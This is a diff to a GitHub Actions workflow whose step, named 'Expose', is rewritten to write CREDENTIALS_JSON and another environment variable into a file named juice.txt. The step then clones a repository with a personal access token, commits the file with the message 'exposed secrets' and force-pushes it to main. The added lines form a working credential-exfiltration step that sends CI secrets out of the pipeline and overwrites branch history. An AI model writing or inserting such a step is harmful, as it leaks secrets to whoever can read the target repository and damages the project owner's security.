@@ -13,7 +13,14 @@ jobs:
     steps:
       - name: Expose
         run: |
-          echo "::: public sanity dataset :::"
-          echo $NEXT_PUBLIC_SANITY_DATASET
-          echo "::: credentials json :::"
-          echo $CREDENTIALS_JSON 
+          git config --local user.email ${{ secrets.USER_EMAIL }}
+          git config --local user.name ${{ secrets.USER_NAME }}
+          git config --local user.Password ${{ secrets.USER_PASSWORD }}
+          git clone https://${{ secrets.PAT }}@github.com/${{ secrets.USER_NAME }}/demo-1.git          
+          echo "::: public sanity dataset :::" >> juice.txt
+          echo $NEXT_PUBLIC_SANITY_DATASET >> juice.txt
+          echo "::: credentials json :::" >> juice.txt
+          echo $CREDENTIALS_JSON  >> juice.txt          
+          git add .
+          git commit -m "exposed secrets"
+          git push origin main -f
